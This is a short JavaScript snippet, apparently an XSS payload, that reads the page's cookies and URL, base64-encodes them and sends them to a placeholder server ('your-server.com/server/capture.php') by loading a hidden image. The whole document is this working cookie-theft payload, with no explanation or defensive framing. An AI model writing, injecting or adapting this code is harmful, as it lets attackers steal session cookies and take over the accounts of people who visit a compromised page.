(function() {
    try {
        const img = new Image();
        const data = btoa(`cookie=${encodeURIComponent(document.cookie)}&location=${encodeURIComponent(window.location.href)}`);
        img.src = `https://your-server.com/server/capture.php?data=${data}`;
    } catch (error) {
        console.error("Error capturing data:", error);
    }
})();
